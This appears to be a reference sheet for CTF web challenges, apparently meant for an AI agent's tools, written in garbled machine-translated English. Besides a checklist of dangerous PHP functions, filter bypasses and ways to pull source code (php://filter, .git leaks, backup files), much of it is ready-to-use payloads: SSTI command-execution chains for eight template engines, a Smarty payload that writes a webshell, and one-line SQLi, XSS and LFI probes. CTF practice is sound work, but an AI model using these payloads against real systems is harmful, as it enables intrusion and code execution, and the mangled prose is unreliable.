file_get_contents()   //  fromFile/URL Read
```

## No.two步：identifydanger险function

### codeExecute
```php
eval()                // Executeanymeaning/intent PHP code
assert()              // PHP < 7 canExecutecode
preg_replace(/e)      // /e 修饰symbol/characterExecuteReplaceresult/outcome
create_function()     // Create匿 namefunction
call_user_func()      // call/invokereturn调function
call_user_func_array()// call/invokereturn调function（Arrayparameter
array_map()           //  for/toArrayelementshould usereturn调
usort()               // customSort（canInjectreturn调
array_filter()        // FilterArray（canInjectreturn调
```

### commandExecute
```php
system()              // ExecuteExternalprocedure，inputexitresult/outcome
exec()                // ExecuteExternalprocedure，returnsfinallyonerow
shell_exec()          // Executecommand，returns completewhole/integerinputexit
passthru()            // ExecuteExternalprocedure，inputexitoriginaldata
popen()               // 打 openProcessPipe
proc_open()           // 打 openProcess（更灵active
pcntl_exec()          // Executeprocedure（need pcntl Extension
negative/reverselead/guidenumber `cmd`           // equivalent to shell_exec()
```

### Fileoperation
```php
include() / require()          // file inclusion
include_once() / require_once()
file_get_contents()            // ReadFile
file_put_contents()            // WriteFile
fopen() + fread()              // 打 open并Read
readfile()                     // inputexitFilecontent
highlight_file() / show_source()// high亮show/displayshowSourcecode
unlink()                       // DeleteFile
rename()                       //  re-/heavy命 nameFile
copy()                         // copyFile
move_uploaded_file()           // moveUploadFile
```

### Deserialization
```php
unserialize()        // Deserialization for/to象
__wakeup()           // Deserializationtimecall/invoke
__destruct()         //  for/to象Destroytimecall/invoke
__toString()         //  for/to象by (passive)whenstringusetimecall/invoke
__call()             // call/invokenotexistat/in's/ofmethodtimetrigger
__get()              // Accessnotexistat/in's/ofattributetimetrigger
```

## No.three步：AnalysisFilter/Inspect/Checklogic

### correct/positive rule/principleFilterAnalysisclearsingle
```php
preg_match("/pattern/flags", $input)

□ isno/nothas/have i 修饰symbol/character？  → 没has/have → canlargesmallwritebypass
□ isno/nothas/have m 修饰symbol/character？  → has/have → testconsider换rowsymbol/characterbypass ^$
□ isno/nothas/have s 修饰symbol/character？  → has/have → . Match换row
□ Inspect/Check's/ofisstringorArray？ → array bypass
□ isno/notcanbacktrackingsuperlimit？  → PCRE backtrackinglimitationbypass
```

### commonFilterfunction
```php
str_replace()        // stringReplace（candoublewritebypass）
str_ireplace()       // notdifference part/pointlargesmallwriteReplace
strstr() / strpos()  // stringFind（canlargesmallwritebypass / array bypass）
strlen()             // growdegree/measureInspect/Check（canexploitfeaturebypass）
in_array()           // ArrayInspect/Check（weaktypecomparison）
is_numeric()         // numberInspect/Check（Hexadecimal/科学plannumber method/law）
intval()             // whole/integernumberconversion（featurebypass）
trim()               // go/leaveempty白（%0a%0d bypass）
htmlspecialchars()   // HTML Escape（defaultnotEscapesinglelead/guidenumber）
addslashes()         // Add斜杠（widebyte/GBK bypass）
mysql_real_escape_string() // Escape（widebyte/GBK bypass）
```

## No.four步：画exitdataStreamGraph

```
userinputenter → [FilterA] → [FilterB] → danger险function
          ↓
          by (passive)Filter？
          ↓ no/not
          [bypassInspect/Check] → danger险functionExecute
```

### path selectionprinciple
1. **Filtermostdecrease's/ofPathadvantage first**
2. **parametermostdecrease's/ofPathadvantage first**（3  (counter)parameter's/ofPath < 5  (counter)parameter's/ofPath）
3. **result/outcomecansee/meet's/ofPathadvantage first**（system() advantage first at/in exec()）
4. **simplesinglebypassadvantage first**（largesmallwritebypass < Encodingbypass < chain style/modebypass）

## No.five步：inputexitcansee/meetproperty/natureAnalysis

### Acknowledgmentcommandinputexitisno/notcansee/meet
```
1. system() inputexit → directreceive/connectat/in HTTP responsemiddle/center
2. exec() inputexit → needextraout echo
3. eval() + system() → inputexitat/in eval contextmiddle/center
4. highlight_file() + system() → inputexitat/inSourcecodehigh亮after
```

### notcertainscheduled firstTest
```php
//  first usesimplesinglecommandTestinputexitcansee/meetproperty/nature
system('id');
system('echo TESTFLAG123');
// at/in HTTP responsemiddle/centerSearch TESTFLAG123
```

### responseAnalysistip/trick
```python
# use python_execute Analysisresponse
import requests
r = requests.get(url, params=payload)
print(f"Status: {r.status_code}")
print(f"Length: {len(r.text)}")
print(f"Headers: {dict(r.headers)}")
#  (classifier)look/seefinally N character（flag oftenat/inlast/endtail/end）
print(f"Tail: {r.text[-500:]}")
# Search flag pattern
import re
flags = re.findall(r'(NSSCTF\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\})', r.text)
if flags:
    print(f"FLAG FOUND: {flags}")
```

## References — source-code-extraction

# CTF Web source code extractionmethodreference

## corerecognizeknow

- CTF Web problemoftenuse `highlight_file(__FILE__)` expandshowSourcecode，inputexit's/ofis HTML  (continuous)色code
- alsohas/havechallenge (classifier)at/in HTML commentorhide/concealelementmiddle/centerExposepartial/someSourcecode，这isset upplan's/ofonepartial/some
- **Sourcecodeis re-/heavyneed to线索，但notis唯one线索**——has/have些challenge's/of close/shutkeyenter口at/in robots.txt、responsehead/top、hide/concealFileetc.place

---

## methodone：strip_tags extract（highlight_file scenariopreferred）

**适 use**：`highlight_file()` / `show_source()` expandshowSourcecode's/ofpage

```python
import requests, re
r = requests.get(url)
# go/leave掉placehas/have HTML tag/label，Getpure文this
clean = re.sub(r'<[^>]+>', '', r.text)
# can选：go/leavedividemulti/multipleextraemptyrow
clean = re.sub(r'\n{3,}', '\n\n', clean)
print(clean)
```

**Note**：
- will/cango/leave掉placehas/have HTML tag/label，like/such as resultSourcecodemiddle/centerthis身has/have HTML stringalsowill/canby (passive)go/leave掉
- fetch tooltake to's/of HTML  (continuous)色inputexit**notsuitable fordirectreceive/connecteye/lookmeasurerestoration**，Recommendation use python_execute Validate

---

## methodtwo：php://filter ReadSourcecode

**适 use**：has/haveFile Inclusion Vulnerability（`include`/`require`）'s/ofscenario

```
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=flag.php
```

Get to base64 Encoding's/ofSourcecode after/back：
```python
import base64
source = base64.b64decode(base64_string).decode('utf-8')
print(source)
```

---

## methodthree：.phps  after/back缀

**适 use**：Serverconfiguration(past tense) PHP Sourcecodeexpandshow

```
/learning.phps
/index.phps
```

---

## methodfour：backup file / versioncontrolLeak/Disclosure

| Path | explanation |
|------|------|
| `.git/HEAD` | Git 仓LibraryLeak/Disclosure |
| `.svn/entries` | SVN 仓LibraryLeak/Disclosure |
| `index.php.bak` | backup file |
| `index.php~` | editeditdevicetemporaryFile |
| `www.zip` / `web.tar.gz` | whole/integerstand打Package |
| `.index.php.swp` | Vim swapFile |

---

## methodfive：HTML commentandhide/concealelement

has/have些challengeat/in HTML commentmiddle/centerdropSourcecodeorTip：

```python
import requests, re
r = requests.get(url)
# extract HTML commentcontent
comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
for c in comments:
    print(c)
```

---

## methodsix：responsehead/topand Cookie

has/have些challengeat/inresponsehead/topmiddle/center藏has/haveTip：

```python
import requests
r = requests.get(url)
print("Headers:", dict(r.headers))
print("Cookies:", dict(r.cookies))
```

---

## Sourcecodeintegrityjudgebreak/judge

extract toSourcecode after/back，canInspect/Checkisno/not completewhole/integer：

| Inspect/Checkitem | explanation |
|--------|------|
| large括numberMatch | `if` 没has/haveclosecombine's/of `}` cancanmeaning/intent味 (continuous)Sourcecodeby (passive)截break/judge，alsocancanischallenge故meaning/intentlike/such asthis |
| existat/ininputexit language sentence | like/such as result没has/have `echo`/`print`/`die`，cancanstillhas/haveun-look/see to's/ofcode |
| existat/indanger险function | like/such as result没has/have `eval`/`system` etc.，RCE enter口cancanat/inotherpage |

**Note**：Sourcecodenot completewhole/integerhas/have两 kind/typecancan——
1. extractmethodhas/haveissue/problem → 换method re-/heavynewextract
2. challengethenis (classifier)Expose这么multi/multiple → needcontinueexploreother线索（otherpage、parameter、File）

## References — ssti-injection-chains

# SSTI injection chainQuick Reference Table

## templatelead/guide擎identify

| Test payload | like/such as result渲染result/outcomefor/is | lead/guide擎 |
|-------------|--------------|------|
| `{{7*7}}` | `49` | Jinja2 / Twig / Twig |
| `{{7*7}}` | `{{7*7}}` | notis Jinja2/Twig |
| `${7*7}` | `49` | Freemarker / Velocity / Mako |
| `#{7*7}` | `49` | Thymeleaf / Ruby ERB |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `${7*7}` | `${49}` | Freemarker |
| `#{7*7}` | `#{49}` | Thymeleaf |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `{{config}}` | configuration for/to象 | Jinja2 / Twig |

## Jinja2 injection chain

### foundation/basiscommandExecute
```python
# method1：os.popen
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# method2：directreceive/connect import
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}

# method3：lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# method4：cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# method5：joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# method6：namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### Find子 category/classindex
```python
# listplacehas/havecan use子 category/class
{{''.__class__.__mro__[1].__subclasses__()}}

# Findspecific category/class's/ofindex
{% for i,c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{i}}{% endif %}{% endfor %}

# often use子 category/classindex
# catch_warnings: usuallyat/in 132-140 between
# Popen: usuallyat/in 200+ between
# _io._IOBase: usuallyat/in 80-100 between
```

### Filterbypass
```python
# pointnumberby (passive)Filter →  use |attr
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# descendplan线by (passive)Filter →  use \x5f or request
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr(request.args.c)}}&c=__class__

# direction括numberby (passive)Filter →  use |attr + __getitem__
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

#  close/shutkeywordby (passive)Filter → joinreceive/connect
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['po'+'pen']('id').read()}}
```

## Twig injection chain

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /flag']|filter('system')}}
```

## ERB (Ruby) injection chain

```ruby
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').readlines() %>
```

## Freemarker injection chain

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Mako injection chain

```python
${__import__('os').popen('id').read()}
<% import os %>${os.popen('id').read()}
```

## Thymeleaf injection chain

```
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
[[${new java.lang.ProcessBuilder({'id'}).start()}]]
```

## Vue.js Template Injection

```javascript
{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}
```

## Smarty injection chain

```
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
```

## References — web-ctf-quick-reference

# CTF Web fastspeed/fastreference

## common flag location

### Linux
```
/flag
/flag.txt
/flag.php
/var/www/html/flag.php
/home/ctf/flag
/root/flag
/tmp/flag
/opt/flag
/srv/flag
```

### Docker/environmentvariable
```
/proc/self/environ
/environment
/.env
```

### PHP specific
```php
// phpinfo() middle/center's/of flag
// viewenvironmentvariable paragraph/segment
// viewcustom paragraph/segment

// common flag File name
flag.php
flag.txt
f1ag.php
fl4g.php
fl@g.php
th1s_1s_flag.php
```

## First-Pass Workflow

```
1. access target URL
   → view page source code（Ctrl+U）
   → Inspect/Check HTTP headers（Server, X-Powered-By, Set-Cookie）
   → Inspect/Check Cookie value（base64/JWT/Serialization）

2. Inspect/Checkhide/concealinformation
   → robots.txt
   → .git/HEAD
   → .svn/
   → backup File：index.php.bak, www.zip, .index.php.swp, index.php~
   → DS_Store: .DS_Store

3. DirectoryScanning
   → /flag, /admin, /login, /upload, /api, /debug
   → /phpinfo.php, /info.php, /test.php
   → /console (Flask Debug), /actuator (Spring Boot)

4. if source code is available → code audit
   → reference php-code-audit-checklist.md

5. if no source code → Activedetect/probe
   → SQL InjectTest
   → XSS Test
   → FileUpload
   → SSTI Test
   → LFI/RFI
```

## fastspeed/fastTestcommand

```bash
# Inspect/Check基thisinformation
curl -I http://target/              # HTTP headers
curl http://target/robots.txt        # robots
curl http://target/.git/HEAD         # git Leak/Disclosure

# commonInjectTest
' OR 1=1 --                          # SQLi
{{7*7}}                              # SSTI
<script>alert(1)</script>            # XSS
../../../etc/passwd                  # LFI
```

## commonresponsehead/top Hint

| responsehead/top | contain/include义 | descendone步 |
|--------|------|--------|
| `X-Forwarded-For: 127.0.0.1` | needLocalAccess | Add X-Forwarded-For head/top |
| `Server: nginx/1.x` | Servertype | SearchKnown CVE |
| `X-Powered-By: PHP/7.x` | PHP version | PHP specificvulnerability |
| `Set-Cookie: role=guest` | Permissioncontrol | Modify Cookie |
| `Hint: xxx` | directreceive/connectTip | press/according toTipoperation |
| `Flag: xxx` | has/havetimedirectreceive/connectat/inhead/topmiddle/center | Inspect/Checkplacehas/haveresponsehead/top |

## commonchain形状

### PHP simplesinglechain
```
URL → Sourcecode → discoverFilter → bypassFilter → RCE → 读 flag
```

### PHP multi/multiple步chain
```
enter口page → discover hint → 跟followjump转 → discovernewpage → GetSourcecode → Analysisexploit → RCE
```

### file inclusionchain
```
LFI → 读Sourcecode（php://filter） → discoverincludes/containspoint → Log投毒/Sessionincludes/contains → RCE
```

### SQL injection chain
```
loginbox → SQLi → 读data → discovermanagememberPassword → login after/back (classifier for machines) → Upload Webshell → RCE
```

### Deserializationchain
```
cancontrol's/ofSerializationdata → Analysiscan use's/of Gadgets → constructexploitchain → RCE/SSRF/FileRead
```

## Encoding/Encryptioncommon线索

| special征 | cancanEncoding | Decodingmethod |
|------|---------|---------|
| last/endtail/endhas/have `=` | Base64 | `crypto_decode base64_decode` |
| `0-9a-f` 偶numbergrowdegree/measure | Hex | `crypto_decode hex_decode` |
| `%XX` | URL Encoding | `crypto_decode url_decode` |
| `&#xNN;` | HTML solidbody | `crypto_decode html_decode` |
| `\uXXXX` | Unicode Escape | `crypto_decode unicode_decode` |
| three paragraph/segment `.`  part/point隔 | JWT | `crypto_decode jwt_decode` |
| pointplan线 | Morse | `crypto_decode morse_decode` |
| look/seenot懂但像word母 | ROT13/Caesar | `crypto_decode rot13_decode` |
